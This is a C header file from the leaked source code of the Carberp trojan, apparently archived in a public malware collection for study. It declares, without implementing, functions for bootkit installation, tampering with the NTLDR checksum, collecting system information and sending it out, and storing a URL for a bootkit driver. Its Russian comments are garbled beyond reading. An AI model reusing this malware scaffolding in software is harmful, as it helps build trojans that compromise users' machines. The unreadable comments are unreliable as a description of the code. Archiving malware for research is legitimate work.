/*
  name      Carberp
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#ifndef UUID_E4500F5134534F79A3663021D13CDBC8
#define UUID_E4500F5134534F79A3663021D13CDBC8

// �-��� ������������� �������� ���������
void DebugReportInit();

// ������ � ����������� � ������� (����� ���������� ������������ ������� � �������)
void DebugReportSystem();

// ������ � ����������� � ���� ���������
void DebugReportBkInstallCode(DWORD BkInstallResult);

// ������ �� ������� ����������� �����
void DebugReportStepByName(const char* StepName);

// ������ � ����������� � MD5 ����� NTLDR
void DebugReportUpdateNtldrCheckSum();

// �������� ������ ��������� ���������� (��������� ������ msinfo32.exe)
void DebugReportCreateConfigReportAndSend();

// ���������� URL, ������� ����� ������������ ������� ������� ��� ������� �� ����
bool DebugReportSaveUrlForBootkitDriver();

// ���������� ���������� ��� ������, ������� ������������� ��������� ��������������� �������
void DebugReportSaveSettings(const char* ParamsList);

// ������ ������ ��� ��������� ����������� ������
void DebugReportRunTests();

#endif // #ifndef UUID_E4500F5134534F79A3663021D13CDBC8